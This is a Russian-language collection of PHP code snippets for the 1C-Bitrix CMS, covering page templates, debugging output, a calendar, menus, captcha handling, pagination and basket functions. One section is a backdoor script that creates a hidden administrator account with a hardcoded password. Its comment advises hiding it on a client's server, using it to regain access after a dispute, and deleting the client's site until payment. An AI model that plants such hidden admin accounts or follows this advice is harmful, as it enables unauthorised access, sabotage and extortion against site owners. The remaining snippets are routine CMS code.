<?
/*** БЫСТРЫЕ МАКРОСЫ ***/
// header и footer
require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/header.php');
$APPLICATION->SetTitle('');

require($_SERVER['DOCUMENT_ROOT'] . '/bitrix/footer.php');

// тестирование
if ($USER->IsAdmin()) {
  echo '<pre>'; print_r($arResult); echo '</pre>';
}
// или
<?php if ($USER->IsAdmin()):?>
	<pre><?php print_r($arResult);?></pre>
<?php endif;?>


// E-mail администратора
$adminEmail = COption::GetOptionString('main', 'email_from');

// Всплывающий календарь и занесение даты в поле (без кнопки)?>
<input type="text" name="date_fld" value="<?echo date(d).".".date(m).".".date(y)?>" onclick="jsCalendar.Show(this, 'date_fld', 'date_fld', '', false, '<?=time()?>','add_cat', true);" />
<div style="display: none">
<?$APPLICATION->IncludeComponent("bitrix:main.calendar", "", array(
	 "SHOW_INPUT" => "N",
	 "FORM_NAME" => "add_cat",
	 "INPUT_NAME" => "date_fld",
	 "INPUT_NAME_FINISH" => "",
	 "INPUT_VALUE" => "",
	 "INPUT_VALUE_FINISH" => "", 
	 "SHOW_TIME" => "N",
	 "HIDE_TIMEBAR" => "Y"
   )
);?>
</div>
<?
/*
Скрипт для создания админской учётной записи
На тот случай, если клиент оказался настолько козлом, что просто изменил доступы к проекту, не известив вас, а все ваши сообщения просто игнорирует, нам поможет простенький скрипт, который создает админскую учетную запись. Его нужно запрятать куда-нибудь поглубже не фтп, и вызвать в случае обмана вас заказчиком. Таким образом мы вернемся доступ к админке. После чего следует сделать резервную копию, сохранить её себе на комп, а сам сайт на хрен снести до получения оплаты :) Уверяю, клиент объявится сам :) 
*/
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php"); 
$login = 'superuser'; // Логин
$password = 'aZi-i8vvAvD[fds'; // Пароль. Делайте со спецсимволами, цифрами и символами верхнего и нижнего регистра, а то не создастся
$groups = array(1); // ID админской группы. Скорее всего =1
$email = 'your@email.com'; // Почта. На всякий случай

$user = new CUser;
$arFields = array(
  "EMAIL"             => $email,
  "LOGIN"             => $login,
  "LID"               => "ru",
  "ACTIVE"            => "Y",
  "GROUP_ID"          => $groups,
  "PASSWORD"          => $password,
  "CONFIRM_PASSWORD"  => $password
);
$ID = $user->Add($arFields);
if(intval($ID) > 0) echo 'Админ создан';
else echo $user->LAST_ERROR;
require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");

/*
Скрипт ничего, НО если в админке будет стоять "использовать каптча при регистрации", то скрипт не добавит пользователя, поэтому предварительно надо отключить соответствующую опцию главного модуля (программно), используя мелод SetOption()
*/


/***** МЕНЮ *****/

// выведем меню типа "top"
$APPLICATION->IncludeComponent(
	"bitrix:menu",
	"horizontal_multilevel",
	Array(
		"ROOT_MENU_TYPE" => "top",
		"MAX_LEVEL" => "3",
		"CHILD_MENU_TYPE" => "left",
		"USE_EXT" => "Y"
	)
);

// пример файла .left.menu_ext.php (меню разделов инфоблока)
if (!defined("B_PROLOG_INCLUDED") || B_PROLOG_INCLUDED!==true) die();
global $APPLICATION;
$aMenuLinksExt = $APPLICATION->IncludeComponent(
	"bitrix:menu.sections",
	"",
	Array(
		"ID" => $_REQUEST["ELEMENT_ID"],
		"IBLOCK_TYPE" => "books",
		"IBLOCK_ID" => "30",
		"SECTION_URL" => "/e-store/books/index.php?SECTION_ID=#ID#",
		"CACHE_TIME" => "3600"
	)
);
$aMenuLinks = array_merge($aMenuLinks, $aMenuLinksExt);

/* КАПЧА */
// обработка
require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/classes/general/captcha.php");
$cptcha = new CCaptcha();
if(!strlen($_REQUEST["captcha"])>0)
 { echo 'Не введен защитный код'; }
elseif(!$cptcha -> CheckCode($_REQUEST["captcha"],$_REQUEST["captcha_sid"]))
 { echo 'Неверный код'; }
else 
 { echo 'true';}

// на страницу
<?$arResult["CAPTCHA_CODE"] = htmlspecialchars($GLOBALS["APPLICATION"]->CaptchaGetCode());?>
<?if (true):?>
	<input type="hidden" name="captcha_sid" value="<?=$arResult["CAPTCHA_CODE"]?>" />
	<div class="reg_code_img"><img alt="Защитный код" width="200" height="28" src="/bitrix/tools/captcha.php?captcha_code=<?=$arResult["CAPTCHA_CODE"]?>" /></div>
	<div class="reg_string_sh"><label>Код подтверждения:</label><div class="top_border"><input type="text" name="captcha" /></div></div>
<?endif;?>


	
/*** ПРОВЕРКА ПАРОЛЯ ПОЛЬЗОВАТЕЛЯ ***/
<?php
$pass = $_REQUEST['pass']; // получаем введенный пароль
$login = CUser::GetLogin(); // получаем логин текущего юзера
$USERcheck = new CUser;
$check = $USERcheck->Login($login, $pass, "N", "Y"); // проверяем верный ли пароль


// вывод даты в формате Битрикса 
echo ConvertTimeStamp();

/*** КОВЕРТАЦИЯ ДАТЫ ИЗ ВИДА '01.01.2013' В ВИД '01 января 2013' ***/
$arDate = ParseDateTime($arResult["ACTIVE_FROM"], FORMAT_DATETIME);
$date = $arDate['DD'] . ' ';
$date .= ToLower(GetMessage('MONTH_'.intval($arDate['MM']).'_S'));
$date .= ' ' . $arDate['YYYY'];
?>



/* 
** при работе с Битриксом для унификации стиля выводимых ошибок можно создавать массив, например $arErrors,
** и заносить туда все ошибки (неправильный ввод данных, ошибки-свойства методов типа LAST_ERROR и т.п.),
** а потом выводить его на странице в кастомизированном виде
*/



/*** ПОСТРАНИЧНАЯ НАВИГАЦИЯ В ДЕТАЛЬНОМ ПРОСМОТРЕ вида 'пред. ... все ... след.' ***/
<div class="pages-nav">
	<?php
	/* Фильтр записей инфоблока 
	(если используется разбиение по разделам, 
	то к фильтру нужно добавить 
	"SECTION_ID" => $arResult['IBLOCK_SECTION_ID']) */

	$arFilter = array("IBLOCK_ID" => $arResult['IBLOCK_ID']);
	// Выбиреам записи
	$rs = CIBlockElement::GetList(array("SORT"=>"ASC"),$arFilter,false,false,array('ID','NAME','DETAIL_PAGE_URL'));
	$i=0;
	while ($ar = $rs -> GetNext()) {
	   $arNavi[$i] = $ar;
			// Если ID полученной записи равен ID новости которая отображается, то запоминаем ее номер
	   if ($ar['ID'] == $arResult['ID']) $iCurPos = $i;
	   $i++;
	}
	// Заполняем массив информацией о следующей и предыдущей записи
	// Ключ предыдущего элемента будет [$iCurPos - 1]
	// Ключ следующего элемента будет [$iCurPos + 1]
	// Если элементы массива с этими ключами существуют то сохраняем их, иначе осталяем пустыми
	// $arLink - массив со ссылками на след и предыд новости
	$arLink = array();
	$arLink['PREVIOUS'] = isset($arNavi[$iCurPos - 1]) ? $arNavi[$iCurPos - 1] : '';
	$arLink['NEXT'] = isset($arNavi[$iCurPos+1]) ? $arNavi[$iCurPos+1] : '';
	?>
	<div class="link-next">
		<?php if (is_array($arLink['NEXT'])):?>
			<a href="<?php echo $arLink['NEXT']['DETAIL_PAGE_URL']?>"><?php echo $arParams['NAME'];?></a>
		<?php endif;?>
	</div>
	<div class="link-prev">
		<?php if (is_array($arLink['PREVIOUS'])):?>
			<a href="<?php echo $arLink['PREVIOUS']['DETAIL_PAGE_URL']?>"><?php echo $arParams['NAME'];?></a>
		<?php endif;?>
	</div>
	<div class="pages"><a class="page-link" href="<?php echo $arResult['LIST_PAGE_URL'];?>"><?php echo $arParams['SECTION_LINK_NAME'];?></a></div>
</div>
<?php
// как применить шаблон для страницы 404.php:
// прописать в настройках сайта выражение php defined('ERROR_404')!==false или defined('ERROR_404')===true для соответствующего шаблона

/*** ФУНКЦИИ ***/

/* 
 * получает ID страны по её имени
 * и выводит сообщение об ошибке в случае отсутствия такой страны у Битрикса
 */
function getIdByCountry($name) {
    if (!function_exists('mb_ucfirst') && extension_loaded('mbstring') && mb_detect_encoding($name) == 'UTF-8')
    {
        function mb_ucfirst($str, $encoding = 'UTF-8') {
            $str = mb_ereg_replace('^[\ ]+', '', $str);
            $str = mb_strtoupper(mb_substr($str, 0, 1, $encoding), $encoding).
                   mb_substr($str, 1, mb_strlen($str), $encoding);
            return $str;
        }
        $name = mb_ucfirst($name);
    } else {
        $name = ucfirst($name);
    }
    $arCountries = GetCountryArray();
    if ($key = array_search($name, $arCountries['reference'])) 
        return $arCountries['reference_id'][$key];
    else
        return 'Такой страны не существует.';
}

/*
добавление товара в корзину
$id — ID элемента,
$qnt — количество товара,
$buy — значение name кнопки добавления в корзину,
$delay — значение name кнопки добавления в отложенные товары,
$msg — имя параметра $_GET, отвечающего за вывод уведомлений
*/
function Add2BasketCustom($id, $qnt, $buy = 'buy', $delay = 'delay', $msg = 'msg') {
    $quant = intval($qnt);
    if ($qnt > 0) {
        if ($_GET[$msg]) {
            unset($_GET[$msg]);
        }
        if ($_REQUEST[$buy]) {
            $prodId = Add2BasketByProductID($id, $quant);
            header('Location: ' . $_SERVER['REQUEST_URI'] . '&' . $msg . '=added');
        }
        elseif ($_REQUEST[$delay]) {
            $prodId = Add2BasketByProductID($id, $quant);
            CSaleBasket::Update($prodId, array('DELAY' => 'Y'));
            header('Location: ' . $_SERVER['REQUEST_URI'] . '&' . $msg . '=ordered');
        }
        else
            echo '<p style="color: red;">Внутренняя ошибка.</p>';
    }
    else
        echo '<p style="color: red;">Введите правильное количество товара.</p>';
}
